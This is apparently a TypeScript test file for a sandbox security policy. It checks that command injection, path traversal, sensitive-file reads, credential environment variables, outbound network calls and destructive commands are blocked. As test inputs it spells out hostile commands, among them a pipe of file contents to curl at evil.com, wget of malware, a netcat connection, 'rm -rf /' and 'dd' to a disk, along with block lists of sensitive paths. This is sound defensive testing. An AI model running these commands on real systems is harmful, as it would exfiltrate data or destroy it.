/**
 * Security Policy Tests (TDD RED Phase)
 *
 * Tests for Tier 4 sandbox security boundaries.
 * These tests verify the security policy prevents:
 * - Command injection (shell metacharacters)
 * - Path traversal (../, symlinks outside root)
 * - Resource access control (sensitive files)
 * - Environment variable isolation
 * - Network access control
 *
 * @module bashx/tests/do/security/security-policy
 */

import { describe, it, expect, beforeEach, vi } from 'vitest'
import {
  SecurityPolicy,
  createSecurityPolicy,
  validateCommand,
  validatePath,
  ValidationResult,
  SecurityViolation,
  SecurityPolicyConfig,
  DEFAULT_BLOCKED_PATHS,
  DEFAULT_BLOCKED_PATTERNS,
  DEFAULT_ALLOWED_COMMANDS,
} from '../../../src/do/security/security-policy.js'

// ============================================================================
// SecurityPolicy Interface Tests
// ============================================================================

describe('SecurityPolicy interface', () => {
  let policy: SecurityPolicy

  beforeEach(() => {
    policy = createSecurityPolicy()
  })

  it('should have validateCommand method', () => {
    expect(typeof policy.validateCommand).toBe('function')
  })

  it('should have validatePath method', () => {
    expect(typeof policy.validatePath).toBe('function')
  })

  it('should have validateEnvironment method', () => {
    expect(typeof policy.validateEnvironment).toBe('function')
  })

  it('should have getConfig method', () => {
    expect(typeof policy.getConfig).toBe('function')
  })

  it('should have audit method for logging', () => {
    expect(typeof policy.audit).toBe('function')
  })
})

// ============================================================================
// Command Injection Prevention Tests
// ============================================================================

describe('Command injection prevention', () => {
  let policy: SecurityPolicy

  beforeEach(() => {
    policy = createSecurityPolicy()
  })

  describe('shell metacharacter blocking', () => {
    it('should block semicolon command chaining', () => {
      const result = policy.validateCommand('echo hello; rm -rf /')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      expect(result.violation?.pattern).toContain(';')
    })

    it('should block pipe operator injection', () => {
      const result = policy.validateCommand('cat file.txt | curl -X POST -d @- evil.com')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      // Pattern contains escaped pipe \|
      expect(result.violation?.pattern).toMatch(/\|/)
    })

    it('should block background execution operator', () => {
      const result = policy.validateCommand('malicious-script &')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      expect(result.violation?.pattern).toContain('&')
    })

    it('should block double ampersand chaining', () => {
      const result = policy.validateCommand('test -f foo && rm -rf /')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      expect(result.violation?.pattern).toContain('&&')
    })

    it('should block double pipe chaining', () => {
      const result = policy.validateCommand('test -f foo || rm -rf /')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      // Pattern string contains escaped pipes \\|\\|
      expect(result.violation?.pattern).toMatch(/\\?\|\\?\|/)
    })

    it('should block command substitution with backticks', () => {
      const result = policy.validateCommand('echo `whoami`')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      expect(result.violation?.pattern).toContain('`')
    })

    it('should block command substitution with $()', () => {
      const result = policy.validateCommand('echo $(cat /etc/passwd)')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      // Pattern contains escaped $\(
      expect(result.violation?.pattern).toMatch(/\$/)
    })

    it('should block process substitution <()', () => {
      const result = policy.validateCommand('diff <(cat file1) <(cat file2)')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      // Pattern contains <\(
      expect(result.violation?.pattern).toMatch(/</)
    })

    it('should block process substitution >()', () => {
      const result = policy.validateCommand('tee >(cat > file)')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
      // Pattern contains >\(
      expect(result.violation?.pattern).toMatch(/>/)
    })

    it('should block here-string with newlines', () => {
      const result = policy.validateCommand('cat <<< $\'line1\\nline2\'')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
    })

    it('should block variable expansion with eval-like patterns', () => {
      const result = policy.validateCommand('echo ${!var}')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
    })
  })

  describe('output redirection blocking', () => {
    it('should block output redirection to sensitive paths', () => {
      const result = policy.validateCommand('echo malicious > /etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
    })

    it('should block append redirection to sensitive paths', () => {
      const result = policy.validateCommand('echo malicious >> /etc/shadow')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('injection')
    })

    it('should block input redirection from sensitive paths', () => {
      const result = policy.validateCommand('mail < /etc/shadow')
      expect(result.valid).toBe(false)
      // /etc/shadow is a sensitive resource, not a path traversal
      expect(result.violation?.type).toBe('sensitive_resource')
    })
  })

  describe('safe commands pass through', () => {
    it('should allow simple echo command', () => {
      const result = policy.validateCommand('echo hello world')
      expect(result.valid).toBe(true)
    })

    it('should allow ls command', () => {
      const result = policy.validateCommand('ls -la /home/user')
      expect(result.valid).toBe(true)
    })

    it('should allow cat with safe path', () => {
      const result = policy.validateCommand('cat /home/user/file.txt')
      expect(result.valid).toBe(true)
    })

    it('should allow pwd command', () => {
      const result = policy.validateCommand('pwd')
      expect(result.valid).toBe(true)
    })

    it('should allow date command', () => {
      const result = policy.validateCommand('date')
      expect(result.valid).toBe(true)
    })
  })
})

// ============================================================================
// Path Traversal Prevention Tests
// ============================================================================

describe('Path traversal prevention', () => {
  let policy: SecurityPolicy

  beforeEach(() => {
    policy = createSecurityPolicy({
      allowedPaths: ['/home/user', '/tmp'],
    })
  })

  describe('dot-dot sequences', () => {
    it('should block ../ traversal attempts', () => {
      const result = policy.validatePath('/home/user/../../../etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('path_traversal')
    })

    it('should block encoded ../ traversal', () => {
      const result = policy.validatePath('/home/user/%2e%2e/%2e%2e/etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('path_traversal')
    })

    it('should block double-encoded traversal', () => {
      const result = policy.validatePath('/home/user/%252e%252e/etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('path_traversal')
    })

    it('should block null byte injection', () => {
      const result = policy.validatePath('/home/user/file.txt\0/../../etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('path_traversal')
    })
  })

  describe('path normalization bypasses', () => {
    it('should block ./././.. traversal', () => {
      const result = policy.validatePath('/home/user/./././../../../etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('path_traversal')
    })

    it('should normalize and validate absolute paths', () => {
      const result = policy.validatePath('/home/user/./subdir/../file.txt')
      // After normalization: /home/user/file.txt - should be valid
      expect(result.valid).toBe(true)
    })

    it('should block paths escaping allowed root', () => {
      // Use /opt path to test path_access (not sensitive_resource)
      const result = policy.validatePath('/opt/app/data.json')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('path_access')
    })
  })

  describe('symlink protection', () => {
    it('should block symlinks pointing outside allowed paths', () => {
      // This would require filesystem access in real implementation
      // For unit tests, we validate that the policy has symlink checking config
      const config = policy.getConfig()
      expect(config.checkSymlinks).toBe(true)
    })
  })

  describe('allowed path validation', () => {
    it('should allow paths within /home/user', () => {
      const result = policy.validatePath('/home/user/documents/file.txt')
      expect(result.valid).toBe(true)
    })

    it('should allow paths within /tmp', () => {
      const result = policy.validatePath('/tmp/scratch/data.json')
      expect(result.valid).toBe(true)
    })

    it('should block paths outside allowed roots', () => {
      const result = policy.validatePath('/var/log/messages')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('path_access')
    })
  })
})

// ============================================================================
// Resource Access Control Tests
// ============================================================================

describe('Resource access control', () => {
  let policy: SecurityPolicy

  beforeEach(() => {
    policy = createSecurityPolicy()
  })

  describe('sensitive file blocking', () => {
    it('should block access to /etc/passwd', () => {
      const result = policy.validatePath('/etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
      expect(result.violation?.resource).toBe('/etc/passwd')
    })

    it('should block access to /etc/shadow', () => {
      const result = policy.validatePath('/etc/shadow')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })

    it('should block access to /etc/sudoers', () => {
      const result = policy.validatePath('/etc/sudoers')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })

    it('should block access to SSH private keys', () => {
      const result = policy.validatePath('/home/user/.ssh/id_rsa')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })

    it('should block access to .ssh directory', () => {
      const result = policy.validatePath('/root/.ssh/authorized_keys')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })
  })

  describe('/proc filesystem blocking', () => {
    it('should block access to /proc', () => {
      const result = policy.validatePath('/proc/self/environ')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })

    it('should block access to /proc/1/cmdline', () => {
      const result = policy.validatePath('/proc/1/cmdline')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })

    it('should block access to /proc/meminfo', () => {
      const result = policy.validatePath('/proc/meminfo')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })
  })

  describe('/sys filesystem blocking', () => {
    it('should block access to /sys', () => {
      const result = policy.validatePath('/sys/class/net/eth0')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })
  })

  describe('device file blocking', () => {
    it('should block access to /dev/mem', () => {
      const result = policy.validatePath('/dev/mem')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })

    it('should block access to /dev/kmem', () => {
      const result = policy.validatePath('/dev/kmem')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('sensitive_resource')
    })

    it('should allow access to /dev/null', () => {
      const result = policy.validatePath('/dev/null')
      expect(result.valid).toBe(true)
    })

    it('should allow access to /dev/zero', () => {
      const result = policy.validatePath('/dev/zero')
      expect(result.valid).toBe(true)
    })

    it('should allow access to /dev/urandom', () => {
      const result = policy.validatePath('/dev/urandom')
      expect(result.valid).toBe(true)
    })
  })
})

// ============================================================================
// Environment Variable Isolation Tests
// ============================================================================

describe('Environment variable isolation', () => {
  let policy: SecurityPolicy

  beforeEach(() => {
    policy = createSecurityPolicy()
  })

  describe('sensitive environment variable blocking', () => {
    it('should block AWS credentials in environment', () => {
      const result = policy.validateEnvironment({
        AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE',
        AWS_SECRET_ACCESS_KEY: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      })
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('env_sensitive')
      expect(result.blockedVars).toContain('AWS_ACCESS_KEY_ID')
      expect(result.blockedVars).toContain('AWS_SECRET_ACCESS_KEY')
    })

    it('should block API keys in environment', () => {
      const result = policy.validateEnvironment({
        API_KEY: 'sk-secret-key',
        OPENAI_API_KEY: 'sk-proj-xxxx',
      })
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('env_sensitive')
    })

    it('should block database URLs with credentials', () => {
      const result = policy.validateEnvironment({
        DATABASE_URL: 'postgres://user:password@localhost:5432/db',
      })
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('env_sensitive')
    })

    it('should block private keys in environment', () => {
      const result = policy.validateEnvironment({
        PRIVATE_KEY: '-----BEGIN RSA PRIVATE KEY-----',
      })
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('env_sensitive')
    })

    it('should block tokens in environment', () => {
      const result = policy.validateEnvironment({
        GITHUB_TOKEN: 'ghp_xxxxxxxxxxxx',
        NPM_TOKEN: 'npm_xxxxxxxxxxxx',
      })
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('env_sensitive')
    })
  })

  describe('safe environment variables pass through', () => {
    it('should allow PATH variable', () => {
      const result = policy.validateEnvironment({
        PATH: '/usr/bin:/bin',
      })
      expect(result.valid).toBe(true)
    })

    it('should allow HOME variable', () => {
      const result = policy.validateEnvironment({
        HOME: '/home/user',
      })
      expect(result.valid).toBe(true)
    })

    it('should allow USER variable', () => {
      const result = policy.validateEnvironment({
        USER: 'sandbox',
      })
      expect(result.valid).toBe(true)
    })

    it('should allow TERM variable', () => {
      const result = policy.validateEnvironment({
        TERM: 'xterm-256color',
      })
      expect(result.valid).toBe(true)
    })

    it('should allow NODE_ENV variable', () => {
      const result = policy.validateEnvironment({
        NODE_ENV: 'production',
      })
      expect(result.valid).toBe(true)
    })
  })

  describe('environment sanitization', () => {
    it('should provide sanitized environment output', () => {
      const result = policy.validateEnvironment({
        PATH: '/usr/bin',
        AWS_SECRET_ACCESS_KEY: 'secret',
        NODE_ENV: 'test',
      })
      expect(result.sanitizedEnv).toBeDefined()
      expect(result.sanitizedEnv?.PATH).toBe('/usr/bin')
      expect(result.sanitizedEnv?.NODE_ENV).toBe('test')
      expect(result.sanitizedEnv?.AWS_SECRET_ACCESS_KEY).toBeUndefined()
    })
  })
})

// ============================================================================
// Network Access Control Tests
// ============================================================================

describe('Network access control', () => {
  let policy: SecurityPolicy

  beforeEach(() => {
    policy = createSecurityPolicy({
      networkPolicy: {
        allowOutbound: false,
        allowedHosts: ['api.example.com'],
        blockedPorts: [22, 23, 25, 3389],
      },
    })
  })

  describe('outbound network blocking', () => {
    it('should block curl to arbitrary hosts when outbound disabled', () => {
      const result = policy.validateCommand('curl https://malicious.com/exfil')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('network')
    })

    it('should block wget to arbitrary hosts', () => {
      const result = policy.validateCommand('wget http://evil.com/malware')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('network')
    })

    it('should block nc/netcat connections', () => {
      const result = policy.validateCommand('nc evil.com 4444')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('network')
    })
  })

  describe('allowed host whitelist', () => {
    it('should allow curl to whitelisted hosts', () => {
      const result = policy.validateCommand('curl https://api.example.com/data')
      expect(result.valid).toBe(true)
    })

    it('should block curl to non-whitelisted hosts', () => {
      const result = policy.validateCommand('curl https://other.example.com/data')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('network')
    })
  })

  describe('port blocking', () => {
    it('should block SSH port connections', () => {
      const result = policy.validateCommand('nc target.com 22')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('network')
      expect(result.violation?.blockedPort).toBe(22)
    })

    it('should block telnet port connections', () => {
      const result = policy.validateCommand('telnet target.com 23')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('network')
    })

    it('should block RDP port connections', () => {
      const result = policy.validateCommand('nc target.com 3389')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('network')
    })
  })

  describe('network policy with outbound enabled', () => {
    let permissivePolicy: SecurityPolicy

    beforeEach(() => {
      permissivePolicy = createSecurityPolicy({
        networkPolicy: {
          allowOutbound: true,
          blockedHosts: ['malicious.com', 'evil.com'],
          blockedPorts: [22],
        },
      })
    })

    it('should allow curl to arbitrary hosts when outbound enabled', () => {
      const result = permissivePolicy.validateCommand('curl https://api.github.com/repos')
      expect(result.valid).toBe(true)
    })

    it('should still block explicitly blocked hosts', () => {
      const result = permissivePolicy.validateCommand('curl https://malicious.com')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('network')
    })
  })
})

// ============================================================================
// Command Allowlist/Blocklist Tests
// ============================================================================

describe('Command allowlist/blocklist', () => {
  describe('default blocked commands', () => {
    let policy: SecurityPolicy

    beforeEach(() => {
      policy = createSecurityPolicy()
    })

    it('should block rm -rf /', () => {
      const result = policy.validateCommand('rm -rf /')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('dangerous_command')
    })

    it('should block dd to disk devices', () => {
      const result = policy.validateCommand('dd if=/dev/zero of=/dev/sda')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('dangerous_command')
    })

    it('should block mkfs commands', () => {
      const result = policy.validateCommand('mkfs.ext4 /dev/sda1')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('dangerous_command')
    })

    it('should block chmod 777 on root', () => {
      const result = policy.validateCommand('chmod -R 777 /')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('dangerous_command')
    })

    it('should block chown on system directories', () => {
      const result = policy.validateCommand('chown -R user:user /etc')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('dangerous_command')
    })
  })

  describe('custom command allowlist', () => {
    let restrictivePolicy: SecurityPolicy

    beforeEach(() => {
      restrictivePolicy = createSecurityPolicy({
        mode: 'allowlist',
        allowedCommands: ['ls', 'cat', 'echo', 'pwd', 'date'],
      })
    })

    it('should allow commands in allowlist', () => {
      expect(restrictivePolicy.validateCommand('ls -la').valid).toBe(true)
      expect(restrictivePolicy.validateCommand('cat file.txt').valid).toBe(true)
      expect(restrictivePolicy.validateCommand('echo hello').valid).toBe(true)
    })

    it('should block commands not in allowlist', () => {
      const result = restrictivePolicy.validateCommand('rm file.txt')
      expect(result.valid).toBe(false)
      expect(result.violation?.type).toBe('command_not_allowed')
    })
  })
})

// ============================================================================
// Security Audit Logging Tests
// ============================================================================

describe('Security audit logging', () => {
  let policy: SecurityPolicy
  let auditLog: SecurityViolation[]

  beforeEach(() => {
    auditLog = []
    policy = createSecurityPolicy({
      onViolation: (violation) => auditLog.push(violation),
    })
  })

  it('should log command injection attempts', () => {
    policy.validateCommand('echo $(cat /etc/passwd)')
    expect(auditLog.length).toBe(1)
    expect(auditLog[0].type).toBe('injection')
    expect(auditLog[0].command).toBe('echo $(cat /etc/passwd)')
    expect(auditLog[0].timestamp).toBeDefined()
  })

  it('should log path traversal attempts', () => {
    policy.validatePath('/home/user/../../../etc/passwd')
    expect(auditLog.length).toBe(1)
    expect(auditLog[0].type).toBe('path_traversal')
    expect(auditLog[0].path).toBe('/home/user/../../../etc/passwd')
  })

  it('should log sensitive resource access attempts', () => {
    policy.validatePath('/etc/shadow')
    expect(auditLog.length).toBe(1)
    expect(auditLog[0].type).toBe('sensitive_resource')
  })

  it('should include audit metadata', () => {
    policy.validateCommand('rm -rf /')
    expect(auditLog[0].timestamp).toBeInstanceOf(Date)
    expect(auditLog[0].severity).toBe('critical')
  })

  it('should provide audit method to retrieve violation history', () => {
    policy.validateCommand('echo $(whoami)')
    policy.validatePath('/etc/passwd')

    const history = policy.audit()
    expect(history.length).toBe(2)
  })
})

// ============================================================================
// Policy Configuration Tests
// ============================================================================

describe('Policy configuration', () => {
  it('should support restrictive mode by default', () => {
    const policy = createSecurityPolicy()
    const config = policy.getConfig()
    expect(config.mode).toBe('blocklist')
  })

  it('should support custom allowed paths', () => {
    const policy = createSecurityPolicy({
      allowedPaths: ['/app', '/data'],
    })
    expect(policy.validatePath('/app/file.txt').valid).toBe(true)
    expect(policy.validatePath('/data/file.txt').valid).toBe(true)
    expect(policy.validatePath('/etc/file.txt').valid).toBe(false)
  })

  it('should support custom blocked patterns', () => {
    const policy = createSecurityPolicy({
      blockedPatterns: [/\beval\b/, /\bexec\b/],
    })
    expect(policy.validateCommand('eval "bad"').valid).toBe(false)
    expect(policy.validateCommand('exec bad').valid).toBe(false)
    expect(policy.validateCommand('echo safe').valid).toBe(true)
  })

  it('should merge default blocked paths with custom', () => {
    const policy = createSecurityPolicy({
      additionalBlockedPaths: ['/custom/secret'],
    })
    // Default paths still blocked
    expect(policy.validatePath('/etc/passwd').valid).toBe(false)
    // Custom path also blocked
    expect(policy.validatePath('/custom/secret').valid).toBe(false)
  })

  it('should expose default blocked paths constant', () => {
    expect(DEFAULT_BLOCKED_PATHS).toContain('/etc/passwd')
    expect(DEFAULT_BLOCKED_PATHS).toContain('/etc/shadow')
  })

  it('should expose default blocked patterns constant', () => {
    expect(DEFAULT_BLOCKED_PATTERNS).toBeDefined()
    expect(DEFAULT_BLOCKED_PATTERNS.length).toBeGreaterThan(0)
  })

  it('should expose default allowed commands constant', () => {
    expect(DEFAULT_ALLOWED_COMMANDS).toBeDefined()
    expect(DEFAULT_ALLOWED_COMMANDS).toContain('ls')
    expect(DEFAULT_ALLOWED_COMMANDS).toContain('cat')
  })
})

// ============================================================================
// Standalone Validation Functions Tests
// ============================================================================

describe('Standalone validation functions', () => {
  it('should export validateCommand function', () => {
    const result = validateCommand('echo hello')
    expect(result.valid).toBe(true)
  })

  it('should export validatePath function', () => {
    const result = validatePath('/tmp/safe.txt')
    expect(result.valid).toBe(true)
  })

  it('should validate injection in standalone function', () => {
    const result = validateCommand('echo $(whoami)')
    expect(result.valid).toBe(false)
    expect(result.violation?.type).toBe('injection')
  })

  it('should validate path traversal in standalone function', () => {
    const result = validatePath('/home/../../../etc/passwd')
    expect(result.valid).toBe(false)
    expect(result.violation?.type).toBe('path_traversal')
  })
})

// ============================================================================
// ValidationResult Type Tests
// ============================================================================

describe('ValidationResult type', () => {
  let policy: SecurityPolicy

  beforeEach(() => {
    policy = createSecurityPolicy()
  })

  it('should return valid result for safe commands', () => {
    const result = policy.validateCommand('echo hello')
    expect(result.valid).toBe(true)
    expect(result.violation).toBeUndefined()
  })

  it('should return complete violation info for blocked commands', () => {
    const result = policy.validateCommand('echo $(cat /etc/passwd)')
    expect(result.valid).toBe(false)
    expect(result.violation).toBeDefined()
    expect(result.violation?.type).toBeDefined()
    expect(result.violation?.message).toBeDefined()
    expect(result.violation?.severity).toBeDefined()
  })

  it('should include suggested safe alternative when available', () => {
    const result = policy.validateCommand('rm -rf /')
    expect(result.suggestion).toBeDefined()
  })
})
